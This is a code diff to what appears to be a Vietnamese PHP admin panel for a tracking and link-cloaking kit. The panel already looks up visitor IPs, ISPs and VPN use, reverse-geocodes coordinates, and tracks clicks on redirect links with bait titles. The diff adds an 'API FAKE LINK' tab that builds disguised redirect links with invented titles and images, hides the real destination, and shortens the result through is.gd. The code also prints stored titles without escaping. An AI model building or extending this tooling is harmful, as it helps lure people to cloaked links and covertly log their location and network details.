@@ -50,9 +50,13 @@ try {
 } catch (Exception $e) { die("Bảo trì."); }
 
 function get_c($k) { global $db; $st = $db->prepare("SELECT value FROM settings WHERE key = ?"); $st->execute([$k]); return $st->fetchColumn(); }
+function make_isgd_short($url) {
+    $ctx = stream_context_create(['http' => ['timeout' => 8, 'header' => "User-Agent: Sentinel_v180 ShortLink\r\n"]]);
+    return trim(@file_get_contents('https://is.gd/create.php?format=simple&url=' . urlencode($url), false, $ctx));
+}
 $ip_v4_serv = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
 
-// ================= 2. API XỬ LÝ (SOI IP / REV-GEO / PUSH / WEBHOOK) =================
+// ================= 2. API XỬ LÝ (SOI IP / REV-GEO / PUSH / SHORT LINK / WEBHOOK) =================
 if (isset($_GET['action'])) {
     header('Content-Type: application/json');
     if ($_GET['action'] === 'quick_check') {
@@ -61,6 +65,37 @@ if (isset($_GET['action'])) {
     if ($_GET['action'] === 'rev_geo') {
         $opts = ['http'=>['header'=>"User-Agent: Sentinel_v180\r\n"]];
         echo @file_get_contents("https://nominatim.openstreetmap.org/reverse?format=json&lat={$_GET['la']}&lon={$_GET['lo']}&accept-language=vi", false, stream_context_create($opts));
+    }
+    if ($_GET['action'] === 'shorten_link') {
+        if (($_SESSION['v180_auth'] ?? '') !== $admin_pass) { http_response_code(403); echo json_encode(['ok' => false, 'error' => 'Chưa đăng nhập admin.']); exit; }
+        $in = json_decode(file_get_contents('php://input'), true) ?: [];
+        $url = trim($in['url'] ?? '');
+        if (!filter_var($url, FILTER_VALIDATE_URL) || !in_array(parse_url($url, PHP_URL_SCHEME), ['http', 'https'], true)) {
+            http_response_code(422); echo json_encode(['ok' => false, 'error' => 'URL không hợp lệ.']); exit;
+        }
+        $short = make_isgd_short($url);
+        if (!$short || !filter_var($short, FILTER_VALIDATE_URL)) {
+            http_response_code(502); echo json_encode(['ok' => false, 'error' => $short ?: 'Không thể tạo link rút gọn is.gd.']); exit;
+        }
+        echo json_encode(['ok' => true, 'short' => $short]);
+    }
+    if ($_GET['action'] === 'auto_fake_link') {
+        if (($_SESSION['v180_auth'] ?? '') !== $admin_pass) { http_response_code(403); echo json_encode(['ok' => false, 'error' => 'Chưa đăng nhập admin.']); exit; }
+        $in = json_decode(file_get_contents('php://input'), true) ?: [];
+        $redir = trim($in['redir'] ?? '');
+        if (!filter_var($redir, FILTER_VALIDATE_URL) || !in_array(parse_url($redir, PHP_URL_SCHEME), ['http', 'https'], true)) {
+            http_response_code(422); echo json_encode(['ok' => false, 'error' => 'Link ẩn/link đích không hợp lệ.']); exit;
+        }
+        $seed = preg_replace('/[^a-z0-9]+/i', '-', parse_url($redir, PHP_URL_HOST) ?: 'link');
+        $seed = trim(strtolower($seed), '-') ?: 'link';
+        do { $lid = substr($seed, 0, 24) . '-' . strtolower(bin2hex(random_bytes(3))); $chk = $db->prepare('SELECT COUNT(*) FROM links WHERE id = ?'); $chk->execute([$lid]); } while ($chk->fetchColumn() > 0);
+        $title = trim($in['title'] ?? '') ?: 'Liên kết chuyển hướng';
+        $desc = trim($in['desc'] ?? '') ?: 'Bấm để mở nội dung được chia sẻ.';
+        $img = trim($in['img'] ?? '') ?: get_c('root_img');
+        $db->prepare("INSERT INTO links (id, title, desc, img, redir) VALUES (?,?,?,?,?)")->execute([$lid, $title, $desc, $img, $redir]);
+        $campaign = $base_url . '?v=' . rawurlencode($lid);
+        $short = make_isgd_short($campaign);
+        echo json_encode(['ok' => true, 'id' => $lid, 'url' => $campaign, 'short' => filter_var($short, FILTER_VALIDATE_URL) ? $short : '']);
     }
     if ($_GET['action'] === 'push') {
         $in = json_decode(file_get_contents('php://input'), true);
@@ -228,6 +263,7 @@ if (isset($_GET['admin'])) {
         <button onclick="st(5,this)" id="nb5" class="sidebar-btn text-blue-500">🤖 TELEGRAM BOT</button>
         <button onclick="st(6,this)" id="nb6" class="sidebar-btn text-yellow-500">📍 VỊ TRÍ CỦA TÔI</button>
         <button onclick="st(7,this)" id="nb7" class="sidebar-btn text-cyan-500">🧭 LINK CHUYỂN HƯỚNG</button>
+        <button onclick="st(8,this)" id="nb8" class="sidebar-btn text-pink-500">🔌 API FAKE LINK</button>
         <div class="mt-auto"><a href="?admin&logout=1" class="text-red-500 opacity-50 hover:opacity-100 transition-all uppercase">Logout</a></div>
     </aside>
 
@@ -251,7 +287,7 @@ if (isset($_GET['admin'])) {
                 </form>
                 <div class="card p-6 shadow-2xl"><div id="vSim" class="bg-[#1a1c23] rounded-2xl overflow-hidden border border-slate-700 text-left shadow-2xl"><div id="vImg" class="h-32 bg-slate-800 flex items-center justify-center text-slate-600 font-black uppercase text-[8px]">NO IMAGE</div><div class="p-4 space-y-1"><p id="vTtl" class="text-white font-black text-xs truncate">Tiêu đề mồi...</p><p id="vDsc" class="text-slate-400 text-[8px] line-clamp-2 italic normal-case">Mô tả hiển thị...</p></div></div></div>
             </div>
-            <div class="lg:col-span-2 card p-0 overflow-hidden h-fit"><table class="w-full text-left font-bold"><thead class="bg-black text-slate-500 uppercase text-[9px]"><tr><th class="p-6">Link & Meta</th><th class="p-6 text-center">Hits</th><th class="p-6 text-right">Action</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($links as $l): $u=$base_url."?v=".$l['id']; ?><tr><td class="p-6"><b><?=$l['title']?></b><br><code class="text-blue-500 text-[8px]" onclick="navigator.clipboard.writeText('<?=$u?>');alert('Copied!')"><?=$u?></code></td><td class="p-6 text-center text-xl text-white font-black"><?=$l['clicks']?></td><td class="p-6 text-right space-x-3"><button onclick='ed(<?=json_encode($l)?>)' class="text-green-500 uppercase">SỬA</button><a href="?admin&del_l=<?=$l['id']?>" onclick="return confirm('XOÁ?')" class="text-red-500 font-black">✕</a></td></tr><?php endforeach; ?></tbody></table></div>
+            <div class="lg:col-span-2 card p-0 overflow-hidden h-fit"><table class="w-full text-left font-bold"><thead class="bg-black text-slate-500 uppercase text-[9px]"><tr><th class="p-6">Link & Meta</th><th class="p-6 text-center">Hits</th><th class="p-6 text-right">Action</th></tr></thead><tbody class="divide-y divide-slate-800"><?php foreach($links as $l): $u=$base_url."?v=".$l['id']; $sid='short_'.preg_replace('/[^a-zA-Z0-9_-]/','_', $l['id']); ?><tr><td class="p-6"><b><?=$l['title']?></b><br><code class="text-blue-500 text-[8px]" onclick="navigator.clipboard.writeText('<?=$u?>');alert('Copied!')"><?=$u?></code><br><button type="button" onclick="makeShort('<?=$sid?>',decodeURIComponent('<?=rawurlencode($u)?>'))" class="text-cyan-400 text-[8px] uppercase mt-2">TẠO LINK IS.GD</button><code id="<?=$sid?>" class="block text-cyan-300 text-[8px] normal-case cursor-pointer" onclick="if(this.innerText)navigator.clipboard.writeText(this.innerText)"></code></td><td class="p-6 text-center text-xl text-white font-black"><?=$l['clicks']?></td><td class="p-6 text-right space-x-3"><button onclick='ed(<?=json_encode($l)?>)' class="text-green-500 uppercase">SỬA</button><a href="?admin&del_l=<?=$l['id']?>" onclick="return confirm('XOÁ?')" class="text-red-500 font-black">✕</a></td></tr><?php endforeach; ?></tbody></table></div>
         </div>
 
         <div id="t2" class="tab-content space-y-8">
@@ -319,6 +355,41 @@ if (isset($_GET['admin'])) {
             </div>
         </div>
 
+
+        <div id="t8" class="tab-content max-w-5xl mx-auto space-y-8">
+            <div class="grid lg:grid-cols-2 gap-8">
+                <div class="card space-y-4 shadow-2xl">
+                    <h3 class="text-pink-500 italic uppercase">🔌 FAKE LINK KẾT NỐI API IS.GD</h3>
+                    <p class="text-[8px] text-slate-400 normal-case italic">Nhập link gốc hoặc lấy nhanh link dự án hiện tại, sau đó gọi API is.gd qua server để tạo link hiển thị rút gọn.</p>
+                    <label class="text-pink-400 text-[8px] uppercase">Nhập link ẩn/link đích để tự tạo link</label>
+                    <input id="hidden_dest_url" placeholder="https://example.com/noi-dung-can-chuyen-den">
+                    <button type="button" onclick="autoCreateFakeLink()" class="bg-rose-700 text-white py-3 rounded-xl font-black uppercase w-full">TỰ TẠO LINK + RÚT GỌN</button>
+                    <div class="grid grid-cols-2 gap-3"><input id="auto_campaign_url" readonly class="text-blue-300 font-mono text-[8px]" placeholder="Link hệ thống tự tạo"><input id="auto_short_url" readonly class="text-cyan-300 font-mono text-[8px]" placeholder="Link is.gd tự tạo"></div>
+                    <hr class="border-slate-800">
+                    <label class="text-pink-400 text-[8px] uppercase">API đang dùng</label>
+                    <input id="api_endpoint" readonly value="https://is.gd/create.php?format=simple&url=" class="text-pink-300 font-mono text-[8px]">
+                    <label class="text-pink-400 text-[8px] uppercase">Link gốc cần rút gọn</label>
+                    <input id="api_source_url" placeholder="https://domain-cua-ban.com/?v=id-link">
+                    <div class="grid grid-cols-2 gap-3">
+                        <button type="button" onclick="loadCurrentProjectUrl()" class="bg-slate-800 text-white py-3 rounded-xl font-black uppercase">LẤY LINK FORM</button>
+                        <button type="button" onclick="shortenApiLink()" class="bg-pink-600 text-white py-3 rounded-xl font-black uppercase">KẾT NỐI API</button>
+                    </div>
+                    <label class="text-pink-400 text-[8px] uppercase">Link fake hiển thị</label>
+                    <input id="api_short_url" readonly class="text-cyan-300 font-mono text-[8px]" placeholder="Kết quả is.gd sẽ hiện ở đây">
+                    <button type="button" onclick="cp('api_short_url')" class="bg-cyan-700 text-white py-3 rounded-xl font-black uppercase">COPY LINK FAKE</button>
+                </div>
+                <div class="card space-y-4">
+                    <h3 class="text-white uppercase italic">Hướng dẫn nhanh</h3>
+                    <p class="text-[8px] text-slate-400 normal-case italic leading-relaxed">1) Tạo/lưu dự án ở tab Dự án chiến dịch. 2) Qua tab này, bấm “Lấy link form” để lấy URL dạng <code>?v=ID</code>. 3) Bấm “Kết nối API” để server gọi is.gd và hiển thị link rút gọn.</p>
+                    <p class="text-[8px] text-amber-400 normal-case italic">API được gọi qua endpoint nội bộ <code>?action=shorten_link</code>, yêu cầu phiên admin để tránh người ngoài lạm dụng.</p>
+                    <div class="bg-black border border-slate-800 rounded-2xl p-4 normal-case">
+                        <p class="text-slate-500 text-[8px] uppercase mb-2">Preview luồng API</p>
+                        <code class="text-pink-300 text-[8px] break-all">POST ?action=shorten_link { url: link_gốc }</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <div id="t6" class="tab-content max-w-5xl mx-auto space-y-8">
             <div class="grid lg:grid-cols-2 gap-8"><div class="card space-y-6"><h3 class="text-yellow-500 italic uppercase">📍 THÔNG TIN CỦA BẠN (ADMIN)</h3><div class="space-y-4 text-[9px] font-mono leading-relaxed"><p class="text-blue-500">🌐 IPv4 SERVER: <b class="text-white"><?=$ip_v4_serv?></b></p><p class="text-blue-500">🌐 IP CỦA BẠN: <b id="adm_ip" class="text-white">Quét...</b></p><p class="text-blue-500">🏢 NHÀ MẠNG: <b id="adm_isp" class="text-white">...</b></p><p class="text-blue-500">📍 VÙNG: <b id="adm_region" class="text-white">...</b></p><hr class="border-slate-800"><p class="text-emerald-500 uppercase">🎯 GPS CHUẨN: <b id="adm_geo" class="text-white">Đang lấy...</b></p><p class="text-emerald-500 uppercase">🏠 ĐỊA CHỈ: <b id="adm_addr" class="text-white italic normal-case">...</b></p></div><button onclick="getAdminLoc()" class="bg-yellow-600 text-white py-4 rounded-2xl font-black w-full shadow-lg italic uppercase">CẬP NHẬT LẠI VỊ TRÍ CỦA TÔI</button></div><div id="adm_map" class="h-[400px] rounded-[3rem] border border-yellow-500/30 shadow-2xl bg-slate-900 overflow-hidden"></div></div>
         </div>
@@ -332,6 +403,10 @@ if (isset($_GET['admin'])) {
         function upPxV(){ document.getElementById('px_v_ttl').innerText=document.getElementById('px_fake_ttl').value || 'Tiêu đề...'; document.getElementById('px_v_dsc').innerText=document.getElementById('px_fake_dsc').value || 'Mô tả...'; const i=document.getElementById('px_fake_img').value; document.getElementById('px_v_img').innerHTML=i?`<img src="${i}" class="w-full h-full object-cover">`:'NO IMAGE'; }
         function presetSafe(type){ const data={newsletter:['ban-tin','Bản tin cập nhật','Đường dẫn chuyển hướng tới bản tin/trang nội dung của bạn.','https://www.gstatic.com/images/branding/product/2x/news_96dp.png','https://example.com'],campaign:['chien-dich','Trang chiến dịch công khai','Trang đích chính thức của chiến dịch.','https://www.gstatic.com/images/branding/product/2x/forms_96dp.png','https://example.com/campaign'],notice:['thong-bao','Thông báo chuyển hướng','Bạn sẽ được chuyển tới trang đích đã công bố.','https://www.gstatic.com/images/branding/product/2x/keep_96dp.png','https://example.com/notice']}[type]; ['safe_lid','safe_title','safe_desc','safe_img','safe_redir'].forEach((id,i)=>document.getElementById(id).value=data[i]); }
         function fillSafeLink(){ document.getElementById('fId').value=document.getElementById('safe_lid').value; document.getElementById('fTtl').value=document.getElementById('safe_title').value; document.getElementById('fDsc').value=document.getElementById('safe_desc').value; document.getElementById('fImg').value=document.getElementById('safe_img').value; document.getElementById('fRed').value=document.getElementById('safe_redir').value; upV(); st(1, document.getElementById('nb1')); }
+        async function makeShort(id,url){ const el=document.getElementById(id); const setText=(txt)=>{ if('value' in el) el.value=txt; else el.innerText=txt; }; setText('Đang tạo link is.gd...'); try{ const res=await fetch('?action=shorten_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})}); const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định'); setText(data.short); await navigator.clipboard.writeText(data.short); alert('Đã tạo và copy link is.gd!'); return data.short; }catch(e){ setText('Lỗi: '+e.message); throw e; } }
+        function loadCurrentProjectUrl(){ const id=document.getElementById('fId').value.trim(); if(!id){ alert('Nhập ID Link ở form Dự án trước.'); return; } document.getElementById('api_source_url').value=<?=json_encode($base_url)?>+'?v='+encodeURIComponent(id); }
+        async function shortenApiLink(){ const src=document.getElementById('api_source_url').value.trim(); if(!src){ alert('Nhập link gốc hoặc bấm Lấy link form.'); return; } try{ await makeShort('api_short_url', src); }catch(e){} }
+        async function autoCreateFakeLink(){ const redir=document.getElementById('hidden_dest_url').value.trim(); if(!redir){ alert('Nhập link ẩn/link đích trước.'); return; } try{ const res=await fetch('?action=auto_fake_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({redir})}); const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định'); document.getElementById('auto_campaign_url').value=data.url; document.getElementById('auto_short_url').value=data.short || 'Không tạo được is.gd, dùng link hệ thống'; document.getElementById('api_source_url').value=data.url; document.getElementById('api_short_url').value=data.short || ''; await navigator.clipboard.writeText(data.short || data.url); alert('Đã tự tạo link và copy kết quả!'); }catch(e){ document.getElementById('auto_short_url').value='Lỗi: '+e.message; } }
         function upW(){ document.getElementById('p_msg').innerText = document.getElementById('i_msg').value; document.getElementById('p_st').innerText = document.getElementById('i_st').value; document.getElementById('p_btn').innerText = document.getElementById('i_btn').value; }
         async function soi(ip){ document.getElementById('ip_detail').innerHTML = '<div class="animate-pulse font-black text-[9px]">TRUY QUÉT...</div>'; const res = await (await fetch('?action=quick_check&ip='+ip)).json(); if(res.status === 'success'){ document.getElementById('ip_detail').innerHTML = `<div class="text-[8px] space-y-1 uppercase italic">🏢 ISP: <b>${res.isp}</b><br>📍 VÙNG: <b>${res.city}, ${res.country}</b><br>🛡️ VPN: <b>${res.proxy ? 'YES' : 'NO'}</b></div>`; } }
         var m = L.map('map').setView([15.8, 108.2], 5); L.tileLayer('https://{s}.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {subdomains:['mt0','mt1','mt2','mt3']}).addTo(m);
